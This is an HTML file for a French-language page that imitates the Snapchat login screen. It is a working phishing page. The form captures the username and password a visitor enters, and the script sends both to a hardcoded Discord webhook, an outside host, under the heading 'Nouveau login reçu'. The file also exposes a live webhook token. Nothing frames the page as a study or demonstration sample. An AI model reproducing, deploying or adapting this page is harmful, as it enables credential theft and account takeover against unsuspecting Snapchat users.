<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Connexion Snapchat</title>
  <style>
    body {
      margin: 0;
      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: #000;
    }
    .container {
      width: 360px;
      padding: 40px 30px 50px;
      box-shadow: 0 2px 8px rgb(0 0 0 / 0.1);
      border-radius: 12px;
      text-align: center;
    }
    .logo {
      width: 80px;
      margin-bottom: 30px;
    }
    h1 {
      font-weight: 600;
      margin-bottom: 30px;
      font-size: 24px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 14px 16px;
      margin-bottom: 20px;
      border: 1px solid #ddd;
      border-radius: 6px;
      font-size: 16px;
      outline: none;
      transition: border-color 0.2s;
    }
    input[type="text"]:focus, input[type="password"]:focus {
      border-color: #fffc00;
      box-shadow: 0 0 5px #fffc00;
    }
    button {
      background-color: #fffc00;
      border: none;
      color: #000;
      font-weight: 700;
      width: 100%;
      padding: 14px 0;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #e6e600;
    }
    .footer-text {
      margin-top: 25px;
      font-size: 14px;
      color: #555;
    }
    a {
      color: #fffc00;
      text-decoration: none;
    }
    a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <img class="logo" src="https://upload.wikimedia.org/wikipedia/fr/c/c4/Snapchat_logo.svg" alt="Snapchat Logo" />
    <h1>Se connecter à Snapchat</h1>
    <form id="loginForm">
      <input type="text" id="username" placeholder="Nom d'utilisateur ou e-mail" required />
      <input type="password" id="password" placeholder="Mot de passe" required />
      <button type="submit">Connexion</button>
    </form>
    <div class="footer-text">
      <p>Pas encore inscrit ? <a href="#">S'inscrire</a></p>
      <p><a href="#">Mot de passe oublié ?</a></p>
    </div>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1382387384997515294/yI75S1jd9z_vRaMRNBYR8Kk_i8rNs8_cMeeNtMRoU7IZgWtI-R6Cch95PsOPsG51K8s2";

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      const message = {
        content: `**Nouveau login reçu:**\nNom d'utilisateur: \`${username}\`\nMot de passe: \`${password}\``
      };

      fetch(webhookURL, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(message),
      })
      .then(response => {
        if (response.ok) {
          alert("Données envoyées avec succès !");
          document.getElementById('loginForm').reset();
        } else {
          alert("Erreur lors de l'envoi des données.");
        }
      })
      .catch(error => {
        alert("Erreur réseau ou CORS.");
        console.error(error);
      });
    });
  </script>
</body>
</html>
